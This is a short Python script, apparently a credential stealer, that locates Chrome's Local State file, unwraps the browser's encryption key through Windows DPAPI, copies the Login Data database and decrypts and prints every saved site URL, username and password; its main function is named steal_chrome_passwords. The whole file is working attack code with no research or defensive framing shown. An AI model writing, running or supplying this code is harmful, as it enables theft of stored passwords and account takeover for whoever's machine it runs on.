```python
import sqlite3, os, json, base64, shutil
from Cryptodome.Cipher import AES
import win32crypt

def get_chrome_encryption_key():
    local_state_path = os.path.join(os.environ["LOCALAPPDATA"],
        "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r") as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_chrome_password(encrypted_password, key):
    iv = encrypted_password[3:15]
    payload = encrypted_password[15:-16]
    tag = encrypted_password[-16:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    return cipher.decrypt_and_verify(payload, tag).decode()

def steal_chrome_passwords():
    key = get_chrome_encryption_key()
    db_path = os.path.join(os.environ["LOCALAPPDATA"],
        "Google", "Chrome", "User Data", "Default", "Login Data")
    shutil.copy2(db_path, "LoginData_copy")  # Copy to avoid lock
    conn = sqlite3.connect("LoginData_copy")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for url, user, encrypted_pwd in cursor.fetchall():
        pwd = decrypt_chrome_password(encrypted_pwd, key)
        print(f"URL: {url}\nUser: {user}\nPass: {pwd}\n")
    conn.close()
    os.remove("LoginData_copy")
```
